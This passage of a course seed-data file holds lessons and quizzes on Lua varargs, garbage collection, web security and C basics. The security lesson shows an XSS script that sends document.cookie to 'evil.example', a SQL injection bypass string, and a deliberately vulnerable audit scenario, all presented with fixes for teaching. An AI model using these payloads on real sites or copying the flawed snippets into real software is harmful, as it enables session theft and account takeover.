      `Lua functions can accept a variable number of arguments using \`...\` (the **vararg expression**), and tables can be converted to and from argument lists with \`table.pack\`/\`table.unpack\`.\n\n## Accepting any number of arguments\n\n\`\`\`lua\nlocal function sum(...)\n  local total = 0\n  for _, n in ipairs({...}) do\n    total = total + n\n  end\n  return total\nend\n\nprint(sum(1, 2, 3))        -- 6\nprint(sum(10, 20, 30, 40)) -- 100\n\`\`\`\n\n\`{...}\` packs all the varargs into a plain table, from there \`ipairs\` works as usual. This breaks down if any argument is \`nil\`, though, since \`ipairs\` stops at the first \`nil\`.\n\n## select: inspecting varargs directly\n\n\`\`\`lua\nlocal function describe(...)\n  print("got " .. select("#", ...) .. " arguments")\n  print(select(2, ...)) -- every argument from position 2 onward\nend\n\ndescribe("a", "b", "c") -- got 3 arguments  /  b  c\n\`\`\`\n\n\`select("#", ...)\` returns the exact argument count, **including trailing nils**, unlike \`#{...}\` which can undercount if a \`nil\` is in the middle or at the end. \`select(n, ...)\` returns every argument from position \`n\` onward.\n\n## table.pack and table.unpack\n\n\`\`\`lua\nlocal function packed(...)\n  return table.pack(...) -- { n = 3, 1, 2, 3 } for example\nend\n\nlocal args = packed(1, 2, 3)\nprint(args.n, args[1], args[2], args[3]) -- 3  1  2  3\n\nprint(table.unpack({10, 20, 30})) -- 10  20  30, spreads a table back into multiple values\n\`\`\`\n\n\`table.pack(...)\` is exactly \`{...}\` plus a reliable \`n\` field for the true count (nil-safe, unlike \`#\`). \`table.unpack(t)\` does the reverse, spreading a table's elements out as individual values, handy for forwarding a captured argument list to another function: \`someFn(table.unpack(args))\`.\n\n> [!TIP]\n> A common pattern is combining both: capture arguments now with \`table.pack\`, and call a function with them later using \`table.unpack\`, effectively deferring a function call, exactly what you'd reach for spread syntax for in JavaScript.`
    ),
    quiz: {
      title: 'Varargs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which expression reliably returns the exact count of varargs, including trailing nils?',
          options: ['#{...}', 'select("#", ...)', '#select(...)', 'table.count(...)'],
          answer: 'select("#", ...)',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "table.unpack takes a table and spreads its elements out as individual return values.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "Lua's ____ expression (three dots) lets a function accept any number of arguments, e.g. function f(...).",
          options: [],
          answer: '...',
        },
      ],
    },
  },
  {
    title: 'Garbage Collection & Weak Tables',
    content: lessonContent(
      'Garbage Collection & Weak Tables',
      `Lua manages memory automatically with a garbage collector (GC), you never manually free a table, but understanding roughly how the GC decides what's collectible helps you avoid subtle memory leaks in long-running programs (like a game server that stays up for days).\n\n## How collection works, briefly\n\nLua's GC is a **tracing** collector: starting from a set of "roots" (globals, the currently running stack, etc.), it walks every reachable table/value and keeps them, anything unreachable gets freed. This means a table is eligible for collection the moment *nothing* still holds a reference to it, you don't need to null it out explicitly the way you might in a manual-memory language, though setting a local to \`nil\` when you're done with a large table can help it get collected sooner rather than later.\n\n\`\`\`lua\ncollectgarbage("collect") -- forces a full garbage collection cycle\nprint(collectgarbage("count")) -- current memory use, in kilobytes\n\`\`\`\n\n\`collectgarbage\` is rarely called manually in normal code, Lua runs the collector incrementally on its own, but it's useful when profiling memory use or right before measuring memory in a benchmark.\n\n## The leak you don't expect: caches\n\n\`\`\`lua\nlocal cache = {}\n\nlocal function getUser(id, fetchFn)\n  if not cache[id] then\n    cache[id] = fetchFn(id)\n  end\n  return cache[id]\nend\n\`\`\`\n\nThis looks harmless, but \`cache\` holds a **strong reference** to every entry forever, even after nothing else in the program cares about that user anymore. In a long-running process, this cache only grows.\n\n## Weak tables\n\n\`\`\`lua\nlocal cache = setmetatable({}, { __mode = "v" }) -- weak values\n\nlocal function getUser(id, fetchFn)\n  if not cache[id] then\n    cache[id] = fetchFn(id)\n  end\n  return cache[id]\nend\n\`\`\`\n\n\`__mode = "v"\` makes the table's **values** weak references, if nothing else in the program still holds a strong reference to a cached value, the garbage collector is free to remove that entry from \`cache\` automatically on its next pass. \`__mode = "k"\` does the same for keys, and \`__mode = "kv"\` makes both weak, useful for building a side-table that attaches extra data to objects without preventing those objects from ever being collected.\n\n> [!WARNING]\n> Weak tables only help if the *values themselves* are collectible tables/userdata elsewhere, numbers and strings are never weakly held the way you might expect (small numbers and short strings in particular are effectively "immortal" values in Lua's implementation), so \`__mode = "v"\` won't shrink a cache whose values are plain numbers.`
    ),
    quiz: {
      title: 'GC & Weak Tables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Setting __mode = 'v' on a table's metatable makes...",
          options: [
            'Its keys weak references',
            'Its values weak references',
            'The whole table immutable',
            'It stop participating in garbage collection entirely',
          ],
          answer: 'Its values weak references',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A table becomes eligible for garbage collection only once nothing in the program still holds a reference to it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____("collect") forces Lua to run a full garbage collection cycle immediately.',
          options: [],
          answer: 'collectgarbage',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Tiny Event Emitter with Coroutines',
    content: lessonContent(
      'Final Project: Build a Tiny Event Emitter with Coroutines',
      `Combine coroutines, metatables, and varargs into a small pub/sub event emitter, a pattern used constantly in game engines and GUI frameworks.\n\n## Requirements\n\n1. Build an \`EventEmitter\` "class" (metatable-based, like earlier OOP lessons) with \`on(event, handler)\`, \`off(event, handler)\`, and \`emit(event, ...)\` methods. \`emit\` should forward any extra arguments straight to every registered handler using varargs.\n2. Support **multiple handlers** per event name, stored in a table keyed by event name, each holding a list of handler functions.\n3. Wrap each handler call in \`pcall\` inside \`emit\`, so one broken handler doesn't stop the rest of that event's handlers from running, log a warning for the failing one instead.\n4. Add an \`onceAsync(event)\` method that returns a coroutine-based helper: calling it pauses (via \`coroutine.yield\`) until the named event next fires, then resumes with that event's arguments, essentially turning a callback-style event into something you can "await" step by step.\n5. Use a weak table (\`__mode = "k"\`) to track any per-listener metadata you add (e.g. a registration timestamp) so that metadata doesn't keep a removed handler function alive forever.\n\n## Stretch goals\n\n- Add wildcard subscriptions (\`emitter:on("*", handler)\` fires on every event).\n- Add a \`once(event, handler)\` convenience method that automatically calls \`off\` after the handler's first invocation.\n- Benchmark emitting 10,000 events with \`os.clock()\` before and after switching a hot path from \`pairs\` to \`ipairs\` where applicable, and note the difference.\n\nSubmit a link to your finished script (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const cybersecurityLessons: SeedLesson[] = [
  {
    title: 'Introduction to Cybersecurity',
    content: lessonContent(
      'Introduction to Cybersecurity',
      `Cybersecurity is the practice of protecting systems, networks, and data from unauthorized access, disruption, or theft. Every decision in security is a tradeoff between usability, cost, and risk, there is no such thing as a perfectly secure system, only one whose risk has been reduced to an acceptable level.\n\n## The CIA triad\n\nAlmost every security control exists to protect one of three properties:\n\n| Property | Meaning | Example attack that breaks it |\n|---|---|---|\n| **Confidentiality** | Only authorized people can read the data | Stealing a database of passwords |\n| **Integrity** | Data cannot be modified without detection | Tampering with a bank transfer amount in transit |\n| **Availability** | Systems stay up and usable | A denial-of-service attack that takes a site offline |\n\n## Key vocabulary\n\n- **Asset**: anything worth protecting (a server, a database, a customer's data).\n- **Threat**: anything that could cause harm to an asset (an attacker, a bug, a flood).\n- **Vulnerability**: a weakness that a threat could exploit (unpatched software, a weak password policy).\n- **Exploit**: the specific technique used to take advantage of a vulnerability.\n- **Risk**: the likelihood of a threat exploiting a vulnerability, multiplied by the impact if it does.\n\n> [!TIP]\n> A useful mental model: **Risk = Threat × Vulnerability × Impact**. Security work usually focuses on reducing vulnerability (patching, configuration) since you can rarely control the threat itself.\n\n## Why this matters even if you're "just" a developer\n\nMost real-world breaches don't start with an exotic zero-day, they start with an unpatched dependency, a misconfigured cloud bucket, or a form field that trusts user input a little too much. Security is not a separate team's job bolted on at the end, it's a property of the code you write every day.`
    ),
    quiz: {
      title: 'Cybersecurity Basics',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of the CIA triad properties does a denial-of-service attack primarily target?',
          options: ['Confidentiality', 'Integrity', 'Availability', 'Accountability'],
          answer: 'Availability',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A vulnerability and an exploit mean the same thing.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A weakness in a system that a threat could take advantage of is called a ____.',
          options: [],
          answer: 'vulnerability',
        },
      ],
    },
  },
  {
    title: 'Common Attack Vectors',
    content: lessonContent(
      'Common Attack Vectors',
      `An **attack vector** is the path or method an attacker uses to gain unauthorized access. Most breaches use one of a small handful of well-known vectors, understanding them is most of what it takes to defend against them.\n\n## Social engineering\n\nThe majority of breaches start by manipulating a person, not a machine:\n\n- **Phishing**: fraudulent emails or messages that impersonate a trusted source to trick someone into clicking a link, entering credentials, or opening an attachment.\n- **Spear phishing**: a targeted phishing attack aimed at a specific person, using details about them (their job title, a real coworker's name) to look convincing.\n- **Pretexting**: inventing a false scenario ("I'm from IT, I need your password to fix an issue") to extract information.\n\n## Malware\n\n| Type | What it does |\n|---|---|\n| Virus | Attaches to a legitimate file, spreads when that file runs |\n| Worm | Spreads on its own across a network, no host file needed |\n| Trojan | Disguised as legitimate software, opens a backdoor once installed |\n| Ransomware | Encrypts a victim's files and demands payment for the key |\n| Spyware | Silently collects information (keystrokes, browsing habits) |\n\n## Brute force and credential attacks\n\n- **Brute force**: trying every possible password combination.\n- **Dictionary attack**: trying common passwords or leaked password lists instead of every combination, far faster in practice.\n- **Credential stuffing**: reusing username/password pairs leaked from one breach to try logging into other, unrelated services, this is why reusing passwords across sites is so dangerous.\n\n> [!WARNING]\n> Credential stuffing works because people reuse passwords. A single breached, low-security forum can lead directly to a compromised email or bank account if the same password was reused.`
    ),
    quiz: {
      title: 'Attack Vectors Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which malware type spreads across a network on its own, without needing a host file?',
          options: ['Virus', 'Worm', 'Trojan', 'Spyware'],
          answer: 'Worm',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Credential stuffing relies on people reusing the same password across multiple sites.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A phishing attack that is specifically targeted at one individual using personal details is called ____ phishing.',
          options: [],
          answer: 'spear',
        },
      ],
    },
  },
  {
    title: 'Network Security Basics',
    content: lessonContent(
      'Network Security Basics',
      `Every device that talks to a network exposes an **attack surface**, the sum of all the points where an attacker could try to get in. Network security is largely about shrinking that surface and controlling what is allowed to cross it.\n\n## Ports and protocols\n\nA port identifies a specific service running on a machine. A handful show up constantly:\n\n| Port | Protocol | Purpose |\n|---|---|---|\n| 22 | SSH | Encrypted remote shell access |\n| 80 | HTTP | Unencrypted web traffic |\n| 443 | HTTPS | Encrypted web traffic (TLS) |\n| 25 | SMTP | Sending email |\n| 3389 | RDP | Remote desktop (Windows) |\n\nTCP is connection-oriented and guarantees delivery order (used for web pages, file transfers), UDP is connectionless and faster but can drop or reorder packets (used for video calls, DNS lookups).\n\n## Firewalls\n\nA firewall inspects traffic and decides what to allow or block, based on rules like source IP, destination port, or protocol.\n\n\`\`\`bash\n# Example: a rule that only allows SSH from a specific trusted IP\nsudo ufw allow from 203.0.113.10 to any port 22\nsudo ufw deny 22\n\`\`\`\n\nThe principle behind good firewall rules is **default deny**: block everything, then explicitly allow only what is needed. This is much safer than trying to enumerate every bad thing to block.\n\n## VPNs\n\nA VPN (Virtual Private Network) creates an encrypted tunnel between a device and a private network over the public internet, so traffic can't be read or tampered with by anyone in between, useful for accessing internal company systems securely from an untrusted network like public Wi-Fi.\n\n> [!TIP]\n> "Attack surface" isn't just about open ports, every dependency, every exposed API endpoint, and every user input field is also part of your attack surface.`
    ),
    quiz: {
      title: 'Network Security Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which port is conventionally used for encrypted HTTPS web traffic?',
          options: ['21', '80', '443', '3389'],
          answer: '443',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A "default deny" firewall policy blocks everything by default and only explicitly allows what is needed.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ creates an encrypted tunnel between a device and a private network over the public internet.',
          options: [],
          answer: 'VPN',
        },
      ],
    },
  },
  {
    title: 'Web Application Security & the OWASP Top 10',
    content: lessonContent(
      'Web Application Security & the OWASP Top 10',
      `The **OWASP Top 10** is the industry-standard list of the most critical web application security risks. Three of the most common show up constantly in real applications:\n\n## SQL injection\n\nWhen user input is concatenated directly into a SQL query, an attacker can change the query's meaning entirely:\n\n\`\`\`js\n// Vulnerable: user input goes straight into the query string\nconst query = \`SELECT * FROM users WHERE username = '\${username}'\`;\n\n// If username is:  ' OR '1'='1\n// The query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'\n// ...which matches every row, bypassing the login check entirely\n\`\`\`\n\n**Fix**: always use parameterized queries / prepared statements, which send the input separately from the query structure so it can never be interpreted as SQL:\n\n\`\`\`js\n// Safe: the database driver handles escaping, input is never treated as SQL\nawait db.query('SELECT * FROM users WHERE username = ?', [username]);\n\`\`\`\n\n## Cross-site scripting (XSS)\n\nXSS happens when an attacker gets their own JavaScript to run in another user's browser, usually by injecting a \`<script>\` tag into content that gets rendered without escaping:\n\n\`\`\`html\n<!-- If a comment field is rendered without escaping, and a user submits: -->\n<script>fetch('https://evil.example/steal?cookie=' + document.cookie)</script>\n<!-- ...that script now runs in every other visitor's browser who views the comment -->\n\`\`\`\n\n**Fix**: escape user-generated content before rendering it as HTML (most modern frameworks like React do this by default), and use a Content-Security-Policy header to restrict what scripts are allowed to run at all.\n\n## Cross-site request forgery (CSRF)\n\nCSRF tricks a logged-in user's browser into submitting a request they didn't intend to make, since browsers automatically attach cookies to requests, a malicious site can make your browser send a request to a site you're logged into.\n\n**Fix**: require a unique, unpredictable CSRF token on state-changing requests (form submissions, not just GET requests), and set cookies with \`SameSite=Strict\` or \`SameSite=Lax\` so they aren't sent on cross-site requests.\n\n> [!WARNING]\n> The common thread across all three: **never trust user input**. Validate it, escape it for the context it's used in (SQL, HTML, a shell command), and use APIs (parameterized queries, templating engines) that make the safe way the easy way.`
    ),
    quiz: {
      title: 'OWASP Top 10 Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the recommended fix for SQL injection?',
          options: [
            'Blocking the letter O in user input',
            'Parameterized queries / prepared statements',
            'Only allowing admins to log in',
            'Using a longer database password',
          ],
          answer: 'Parameterized queries / prepared statements',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Setting cookies with SameSite=Strict or SameSite=Lax helps defend against CSRF.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'An attack where malicious JavaScript is injected into a page and runs in other users\' browsers is called cross-site ____.',
          options: [],
          answer: 'scripting',
        },
      ],
    },
  },
  {
    title: 'Cryptography Basics',
    content: lessonContent(
      'Cryptography Basics',
      `Cryptography underpins almost every security control: HTTPS, password storage, and secure messaging all depend on it. You don't need to implement algorithms yourself, but you do need to know which tool fits which job.\n\n## Hashing vs. encryption\n\nThese are often confused, but solve different problems:\n\n| | Hashing | Encryption |\n|---|---|---|\n| Direction | One-way, cannot be reversed | Two-way, can be decrypted with the right key |\n| Use case | Verifying passwords, detecting tampering | Protecting data you need to read again later |\n| Example | \`bcrypt\`, \`SHA-256\` | AES, RSA |\n\n**Never store passwords in plain text, and never encrypt them either**, always hash them with a slow, salted algorithm designed for passwords, like bcrypt:\n\n\`\`\`js\nimport bcrypt from 'bcryptjs';\n\nconst passwordHash = await bcrypt.hash(plainTextPassword, 10); // 10 = cost factor\nconst matches = await bcrypt.compare(attemptedPassword, passwordHash);\n\`\`\`\n\nbcrypt is deliberately slow and includes a random **salt** per password, so two identical passwords produce different hashes, and brute-forcing many hashes at once can't be sped up with a precomputed table (a "rainbow table").\n\n## Symmetric vs. asymmetric encryption\n\n- **Symmetric**: the same key encrypts and decrypts (AES). Fast, but both parties need to already share the key securely.\n- **Asymmetric**: a public key encrypts, only the matching private key can decrypt (RSA). Slower, but solves the key-sharing problem, you can publish your public key freely.\n\n## TLS/HTTPS\n\nHTTPS uses both: an asymmetric handshake to securely agree on a shared secret, then fast symmetric encryption for the actual data transfer. This is why the browser padlock icon means the connection is encrypted and the server's identity was verified by a certificate, but it says nothing about whether the site itself is trustworthy.\n\n> [!TIP]\n> "Encrypted" is not the same as "secure": a phishing site can have a valid HTTPS certificate too. TLS protects data in transit, it doesn't vouch for who's on the other end.`
    ),
    quiz: {
      title: 'Cryptography Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which is the correct way to store user passwords?',
          options: [
            'Encrypt them with AES so they can be decrypted if needed',
            'Hash them with a slow, salted algorithm like bcrypt',
            'Store them in plain text for easy lookup',
            'Encode them with Base64',
          ],
          answer: 'Hash them with a slow, salted algorithm like bcrypt',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A valid HTTPS certificate guarantees that a website itself is trustworthy, not just that the connection is encrypted.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In ____ encryption, the same key is used to both encrypt and decrypt the data.',
          options: [],
          answer: 'symmetric',
        },
      ],
    },
  },
  {
    title: 'Authentication & Access Control',
    content: lessonContent(
      'Authentication & Access Control',
      `Authentication answers "who are you?", authorization (access control) answers "what are you allowed to do?". Getting both right is one of the highest-leverage things you can do for an application's security.\n\n## Strong password practices\n\n- Enforce a minimum length (length matters far more than forcing arbitrary symbol/number rules).\n- Check new passwords against known breached-password lists, not just complexity rules.\n- Never limit maximum password length aggressively or block pasting into password fields, both push users toward weaker, reused passwords.\n\n## Multi-factor authentication (MFA)\n\nMFA requires two or more of these independent factors:\n\n1. **Something you know** (a password, a PIN)\n2. **Something you have** (a phone, a hardware security key)\n3. **Something you are** (a fingerprint, facial recognition)\n\nEven if a password is stolen through phishing, MFA stops most account takeovers because the attacker also needs the second factor.\n\n## The principle of least privilege\n\nEvery user, process, and service should have the **minimum** access needed to do its job, nothing more. A web server that only needs to read a database table shouldn't have a database account that can also drop tables.\n\n## Role-based access control (RBAC)\n\nRather than granting permissions to individuals one by one, RBAC groups permissions into roles (like \`STUDENT\`, \`INSTRUCTOR\`, \`ADMIN\`), and assigns users to roles. This makes access easy to reason about and audit, when someone changes teams, you change their role, not a long list of individual permissions.\n\n\`\`\`js\n// Checking a role before allowing an action, a simple RBAC check\nfunction requireRole(user, ...allowedRoles) {\n  if (!allowedRoles.includes(user.role)) {\n    throw new Error('Forbidden: insufficient permissions');\n  }\n}\n\`\`\`\n\n> [!WARNING]\n> Access control bugs are rarely about the check being wrong, they're about a check being **missing** entirely on one endpoint. Every action that changes or reveals data needs its own explicit authorization check, don't assume that hiding a button in the UI is enough, the API endpoint itself must enforce it.`
    ),
    quiz: {
      title: 'Auth & Access Control Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of these is an example of the "something you have" MFA factor?',
          options: ['A password', 'A fingerprint', 'A hardware security key', 'A security question'],
          answer: 'A hardware security key',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The principle of least privilege means giving every user or service the minimum access needed to do its job.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Grouping permissions into named roles like STUDENT, INSTRUCTOR, and ADMIN, then assigning users to roles, is called ____-based access control.',
          options: [],
          answer: 'role',
        },
      ],
    },
  },
  {
    title: 'Final Project: Security Audit Report',
    content: lessonContent(
      'Final Project: Security Audit Report',
      `Time to put everything together. You'll perform a security audit of a small, deliberately flawed web application and write up your findings like a real security assessment.\n\n## Scenario\n\nYou're reviewing a simple app with a login form, a comment section, and a "search users" feature. Here's a sketch of how it currently works:\n\n\`\`\`js\n// Login check\nconst query = \`SELECT * FROM users WHERE email = '\${email}' AND password = '\${password}'\`;\n\n// Rendering a comment\nelement.innerHTML = comment.text;\n\n// Password storage\nawait db.query('INSERT INTO users (email, password) VALUES (?, ?)', [email, password]);\n\n// Any logged-in user can call this to view any other user's private profile:\napp.get('/api/users/:id', (req, res) => res.json(getUser(req.params.id)));\n\`\`\`\n\n## Requirements\n\nWrite up a security audit report (as a markdown file in a repo, or a doc, your choice) that includes:\n\n1. **Identify at least 4 distinct vulnerabilities** in the scenario above, name each one using proper terminology (e.g. "SQL injection", "stored XSS", "broken access control", "insecure password storage").\n2. For each vulnerability, explain **how an attacker could exploit it** in plain language, one or two sentences is enough.\n3. For each vulnerability, propose a **specific fix**, referencing techniques from this course (parameterized queries, output escaping, password hashing, authorization checks, etc.).\n4. Rank the four vulnerabilities by severity (which would you fix first, and why?).\n5. Add a short "general recommendations" section with at least 2 practices a team could adopt going forward (e.g. dependency scanning, code review checklists, MFA for admin accounts).\n\n## Stretch goals\n\n- Propose a rewritten, safe version of one of the vulnerable code snippets above.\n- Research and briefly summarize one real-world breach that resulted from a vulnerability of the same class as one you identified.\n\nSubmit a link to your finished report below (a repo, gist, or shared doc), an instructor will review it before you can mark this lesson complete. Good luck! 🔒`
    ),
    requiresSubmission: true,
  },
];

const cLessons: SeedLesson[] = [
  {
    title: 'C Basics',
    content: lessonContent(
      'C Basics',
      `C is a compiled, statically-typed language from 1972 that still powers operating systems, databases, and language runtimes today. Learning C means learning how a computer actually works, no hidden garbage collector, no implicit conversions you didn't ask for, just you and the machine.\n\n## Your first program\n\n\`\`\`c\n#include <stdio.h>\n\nint main(void) {\n    printf("Hello, Kodstigen!\\n");\n    return 0;\n}\n\`\`\`\n\n- \`#include <stdio.h>\` pulls in the standard I/O library, so \`printf\` exists.\n- \`int main(void)\` is the entry point every C program starts from, it returns an \`int\` **exit code** to the operating system, \`0\` means "success".\n- \`printf\` formats and prints text, \`\\n\` is a newline escape sequence, unlike Python there's no automatic newline after a print.\n\n## Compiling and running\n\nC is compiled ahead of time, there's no interpreter:\n\n\`\`\`bash\ngcc hello.c -o hello\n./hello\n\`\`\`\n\n\`gcc\` translates your \`.c\` source file into a native executable, \`-o hello\` names the output file. Every time you change the source, you recompile before running again.\n\n## Variables and types\n\nUnlike Python or JavaScript, every variable in C has a fixed, explicit type:\n\n\`\`\`c\nint xp = 0;\nfloat ratio = 0.5f;\nchar grade = 'A';\nxp += 10;\n\`\`\`\n\nThere's no \`var\`/\`let\` inference, you declare the type up front and it never changes. This is why C is fast, the compiler knows exactly how much memory each variable needs and never has to check types at runtime.\n\n> [!TIP]\n> C has no built-in string type, a "string" is really just an array of \`char\` ending in a special \`\\0\` (null terminator) byte. You'll see why that matters a lot once we get to pointers.`
    ),
    quiz: {
      title: 'C Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does main() returning 0 signal to the operating system?',
          options: ['An error occurred', 'The program succeeded', 'The program is still running', 'Nothing, the return value is ignored'],
          answer: 'The program succeeded',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In C, a variable\'s type must be declared up front and cannot change later.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to compile hello.c into an executable called hello with gcc is: gcc hello.c -o ____',
          options: [],
          answer: 'hello',
        },
      ],
    },
  },
  {
    title: 'Structs',
    content: lessonContent(
      'Structs',
      `C has no classes, but it has **structs**: a way to group related variables together under one name.\n\n\`\`\`c\n#include <stdio.h>\n\nstruct Point {\n    int x;\n    int y;\n};\n\nint main(void) {\n    struct Point p;\n    p.x = 3;\n    p.y = 4;\n    printf("(%d, %d)\\n", p.x, p.y);\n    p.x += 1;\n    return 0;\n}\n\`\`\`\n\n\`.x\` and \`.y\` are the struct's **members**, accessed with the dot operator, each one assigned separately here. Some C compilers also support initializer syntax like \`struct Point p = { .x = 3, .y = 4 };\` (a designated initializer, setting each member by name in one go), but this course sticks to plain assignment since it's supported more consistently everywhere, including the interpreter running these examples.\n\n## Memory layout\n\nA struct isn't magic, it's just its members laid out **contiguously** in memory, one right after another, in declaration order (the compiler may add small gaps called padding for alignment, but conceptually think of it as one solid block):\n\n\`\`\`c\nstruct Point {   // sizeof(struct Point) is typically 8 bytes\n    int x;        // bytes 0-3\n    int y;        // bytes 4-7\n};\n\`\`\`\n\nThis matters a lot once pointers enter the picture: a pointer to a struct is just an address pointing at the start of that block, and every member is at a fixed, predictable offset from it.\n\n## typedef\n\nWriting \`struct Point\` everywhere gets tedious, \`typedef\` gives it a shorter alias:\n\n\`\`\`c\n#include <stdio.h>\n\ntypedef struct {\n    int x;\n    int y;\n} Point;\n\nint main(void) {\n    Point p;\n    p.x = 3;\n    p.y = 4;\n    printf("(%d, %d)\\n", p.x, p.y);\n    return 0;\n}\n\`\`\`\n\nNow \`Point\` can be used on its own, exactly like a built-in type such as \`int\`.`
    ),
    quiz: {
      title: 'Structs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "How are a struct's members arranged in memory?",
          options: ['Randomly, wherever there is free space', 'Contiguously, one after another', 'Each member gets its own separate heap allocation', 'They are not stored, only computed on access'],
          answer: 'Contiguously, one after another',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'typedef creates a shorter alias for a type, like naming an anonymous struct Point instead of writing struct Point every time.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Given "struct Point p;", you access its x member with the ____ operator: p.x',
          options: [],
          answer: 'dot',
        },
      ],
    },
  },
  {
    title: 'Pointers',
    content: lessonContent(
      'Pointers',
      `A **pointer** is just a variable that stores a memory address instead of a value. That's it, everything else about pointers is a consequence of that one idea.\n\n\`\`\`c\n#include <stdio.h>\n\nint main(void) {\n    int xp = 10;\n    int *xpPtr = &xp;   // xpPtr holds the address of xp\n\n    printf("value: %d\\n", xp);       // 10\n    printf("address: %p\\n", (void*)&xp);\n    printf("via pointer: %d\\n", *xpPtr); // 10, dereferenced\n\n    *xpPtr = 20;    // writes through the pointer\n    printf("now: %d\\n", xp);         // 20\n    return 0;\n}\n\`\`\`\n\n- \`&xp\` is the **address-of** operator, "give me the memory address where \`xp\` lives".\n- \`int *xpPtr\` declares \`xpPtr\` as "a pointer to an \`int\`".\n- \`*xpPtr\` is the **dereference** operator used on an existing pointer, "go to the address this pointer holds, and give me (or set) the value there".\n\n## Why bother?\n\nWithout pointers, C functions can only work with **copies** of the arguments you pass in:\n\n\`\`\`c\n#include <stdio.h>\n\nvoid doubleIt(int n) {\n    n = n * 2;   // only changes the local copy\n}\n\nvoid doubleItProperly(int *n) {\n    *n = *n * 2; // changes the caller's variable\n}\n\nint main(void) {\n    int x = 5;\n    doubleIt(x);\n    printf("%d\\n", x);          // still 5\n    doubleItProperly(&x);\n    printf("%d\\n", x);          // now 10\n    return 0;\n}\n\`\`\`\n\nPassing a pointer lets a function reach back into the caller's memory and modify it directly, this is how C simulates "pass by reference" since it only ever passes values (and an address is just a value).\n\n> [!WARNING]\n> A pointer that doesn't point at valid memory (never initialized, or freed already) is called a **dangling pointer**. Dereferencing one is undefined behavior, it might crash, or worse, silently corrupt unrelated memory. Always initialize pointers, even to \`NULL\`.`
    ),
    quiz: {
      title: 'Pointers Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the & operator do when applied to a variable?',
          options: ['Doubles its value', 'Returns its memory address', 'Dereferences it', 'Deletes it'],
          answer: 'Returns its memory address',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Passing a pointer to a function lets that function modify the caller\'s original variable.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Given "int *p = &x;", the ____ operator (*p) reads or writes the value p points to.',
          options: [],
          answer: 'dereference',
        },
      ],
    },
  },
  {
    title: 'Enums',
    content: lessonContent(
      'Enums',
      `An **enum** (enumeration) creates a set of named integer constants, useful whenever a variable should only ever hold one of a small, fixed set of values.\n\n\`\`\`c\n#include <stdio.h>\n\nenum Status {\n    PENDING,   // 0\n    APPROVED,  // 1\n    REJECTED   // 2\n};\n\nint main(void) {\n    enum Status s = APPROVED;\n    if (s == APPROVED) {\n        printf("Approved!\\n");\n    }\n    return 0;\n}\n\`\`\`\n\nBy default, the first member is \`0\` and each following one increments by \`1\`. You can override this explicitly:\n\n\`\`\`c\nenum HttpStatus {\n    OK = 200,\n    NOT_FOUND = 404,\n    SERVER_ERROR = 500\n};\n\`\`\`\n\n## Why not just use plain ints?\n\nYou *could* use \`#define APPROVED 1\`, but an enum gives the compiler (and your editor) a real type to check, so passing an unrelated integer where a \`Status\` is expected can trigger a warning, and switch statements over an enum can warn you if you forgot to handle a case:\n\n\`\`\`c\n#include <stdio.h>\n\nenum Status { PENDING, APPROVED, REJECTED };\n\nint main(void) {\n    enum Status s = APPROVED;\n    switch (s) {\n        case PENDING:  printf("Waiting...\\n"); break;\n        case APPROVED: printf("Approved!\\n"); break;\n        case REJECTED: printf("Rejected.\\n"); break;\n    }\n    return 0;\n}\n\`\`\`\n\nUnder the hood, an enum value really is just an \`int\`, C has no runtime type safety here, it's purely a naming and readability convenience, but a very useful one.`
    ),
    quiz: {
      title: 'Enums Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'By default, what integer value does the first member of an enum get?',
